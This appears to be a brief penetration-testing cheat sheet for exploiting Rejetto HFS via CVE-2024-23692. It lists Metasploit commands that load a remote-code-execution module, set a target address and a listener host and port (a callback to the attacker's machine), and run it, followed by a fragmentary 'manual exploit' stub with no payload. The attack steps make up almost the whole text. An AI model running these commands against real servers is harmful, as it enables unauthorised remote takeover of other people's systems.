# Rejetto HFS Exploitation (CVE-2024-23692)

## Metasploit

use exploit/windows/http/rejetto_hfs_rce_cve_2024_23692
set RHOSTS <TARGET_IP>
set RPORT 80
set LHOST <KALI_IP>
set LPORT 4444
run

Manual Exploit
Craft search? RCE payload

Deliver via browser or curl
